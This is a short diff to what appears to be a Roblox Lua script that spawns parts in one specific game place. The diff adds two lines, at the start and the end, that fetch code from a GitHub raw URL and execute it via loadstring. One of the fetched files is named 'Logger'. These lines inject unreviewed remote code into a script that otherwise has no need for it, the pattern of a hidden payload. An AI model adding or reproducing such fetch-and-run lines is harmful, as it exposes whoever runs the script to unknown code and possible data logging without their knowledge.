@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/abdalmouz/Scripts/main/AzoozNotify", true))()
 if game.PlaceId == 189707 then
     
 local part = Instance.new("Part")
@@ -100,3 +101,4 @@ v.CanCollide = true
 end
 end
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/abdalmouz/Scripts/main/Logger", true))()
